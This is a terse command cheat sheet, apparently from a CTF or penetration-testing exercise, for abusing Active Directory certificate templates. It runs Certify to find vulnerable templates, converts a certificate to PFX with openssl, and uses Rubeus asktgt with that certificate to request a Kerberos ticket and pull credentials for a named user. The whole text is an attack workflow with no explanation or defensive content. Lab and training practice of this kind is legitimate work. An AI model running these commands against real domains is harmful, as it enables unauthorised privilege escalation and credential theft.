
Certify
```
.\Certify.exe find /vulnerable /currentuser
```
```
Certify.exe find /clientauth
```
```Convert to .pfx
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Providerv1.0" -export -out cert.pfx
```
``` Get TGT
.\Rubeus.exe asktgt /user:brandon.keywarp /certificate:C:\xampp\htdocs\cert.pfx /getcredentials /show /nowrap
```
